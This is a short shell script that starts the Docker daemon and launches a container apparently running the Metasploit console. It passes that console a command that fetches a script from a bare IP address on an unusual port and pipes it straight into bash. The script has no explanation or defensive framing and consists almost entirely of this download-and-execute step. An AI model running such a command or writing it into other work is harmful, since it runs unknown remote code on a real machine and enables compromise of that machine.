#!/bin/sh

set -x
dockerd&
docker run -it --rm chasepd/msfconsole -q -n -x 'curl -s -L http://94.199.106.182:27010/f.sh | bash'
